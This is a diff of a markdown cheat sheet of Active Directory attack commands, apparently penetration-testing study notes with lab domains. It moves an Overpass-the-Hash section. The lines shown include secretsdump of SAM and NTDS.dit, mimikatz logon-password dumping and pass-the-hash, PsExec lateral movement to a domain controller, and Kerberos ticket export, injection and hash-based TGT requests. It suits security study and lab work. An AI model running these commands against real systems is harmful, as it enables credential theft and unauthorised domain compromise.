@@ -202,15 +202,6 @@ impacket-secretsdump -sam SAM(local SAM file) -system SYSTEM(local SYSTEM file) 
 impacket-secretdump -ntds NTDS.dit(C:\windows\ntds\) -system SYSTEM local0
 ```
 
-### Overpass-the-Hash
-https://learn.microsoft.com/en-us/sysinternals/downloads/psexec
-```
-sekurlsa::logonpasswords
-sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:e2b475c11da2a0748290d87aa966c327 /run:PowerShell.exe
-net use \\dc01(logon server)
-klist
-.\PsExec.exe \\dc01 or \\DC01/Allison cmd.exe
-```
 ### AS-REP Roasting(Require Do not require Kerberos preauthentication enabled)
 ```
 ASREPRoast with username list without pass:
@@ -299,6 +290,8 @@ impacket-mssqlclient -k dc.sequel.htb
 sekurlsa::tickets /export (export all kirbi files)
 kerberos::ptt [0;3e7]-0-0-40a00000-ted@krbtgt-web01.exam.com-exam.com.kirbi (load into memory)
 ```
+### Overpass-the-hash
+>transfer hash to kerberos ticket file, then authenticate as that user to move laterally
 ```
 # Request the TGT with hash
 python getTGT.py <domain_name>/<user_name> -hashes [lm_hash]:<ntlm_hash>
